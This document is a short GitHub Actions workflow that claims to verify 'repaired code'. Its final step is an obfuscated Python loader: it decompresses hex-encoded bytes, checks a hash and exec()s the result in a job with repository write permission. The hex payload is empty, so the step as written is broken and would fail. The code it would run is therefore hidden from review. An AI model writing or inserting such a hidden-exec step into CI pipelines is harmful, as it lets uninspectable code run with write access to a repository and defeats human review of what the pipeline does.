name: Verify complete repaired code
on:
  push:
    branches: [validation/repaired-checks]
    paths: [.github/workflows/complete-check.yml]
permissions:
  contents: write
jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ba462f5223a664caf87faec4bfa9f4ce836041d1
          fetch-depth: 0
      - uses: ./.github/actions/prepare-validation
      - run: python -c "import hashlib,zlib; code=zlib.decompress(bytes.fromhex('')); assert hashlib.sha256(code).hexdigest()=='dd7b233f4b44b4a4d1bfa4136774fcbb0ec4d539b0cc082629776c7aba9fff09'; exec(compile(code,'complete-native-repair.py','exec'))"
